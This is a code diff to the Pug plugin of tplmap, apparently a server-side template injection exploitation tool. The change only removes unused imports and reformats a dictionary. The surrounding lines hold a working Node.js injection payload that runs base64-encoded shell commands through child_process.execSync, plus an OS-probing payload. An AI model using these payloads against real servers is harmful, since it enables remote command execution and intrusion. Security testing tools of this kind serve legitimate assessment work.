@@ -1,7 +1,4 @@
 from tplmap.plugins.languages import javascript
-from tplmap.utils import rand
-from tplmap.utils.loggers import log
-from tplmap.utils.strings import chunkit, md5, quote
 
 
 class Pug(javascript.Javascript):
@@ -53,9 +50,7 @@ class Pug(javascript.Javascript):
                     "call": "render",
                     "execute": """global.process.mainModule.require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString())""",
                 },
-                "evaluate": {
-                    "test_os": """global.process.mainModule.require('os').platform()"""
-                },
+                "evaluate": {"test_os": """global.process.mainModule.require('os').platform()"""},
             }
         )
 
